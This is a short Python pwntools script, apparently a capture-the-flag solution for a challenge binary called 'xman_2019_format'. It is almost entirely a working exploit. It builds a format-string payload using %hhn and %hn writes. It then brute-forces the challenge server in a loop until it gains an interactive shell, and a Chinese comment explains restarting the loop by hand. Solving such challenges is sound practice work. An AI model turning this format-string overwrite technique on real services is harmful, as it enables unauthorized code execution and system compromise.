from pwn import *
from sys import argv

# context(os='linux', arch='i386', log_level='debug')
binary = './xman_2019_format'
elf = ELF(binary)

payload = b'%12c' + b'%10$hhn|'
payload += b'%34219c' + b'%18$hn'
while 1:
    # p = process(binary)
    p = remote('node4.buuoj.cn', 25923)
    try:
        p.sendlineafter(b'...', payload)
        p.recv()
        p.interactive()
        #注意这里如果爆破失败则需要手动Ctrl+c进行下一轮循环
    except:
        p.close()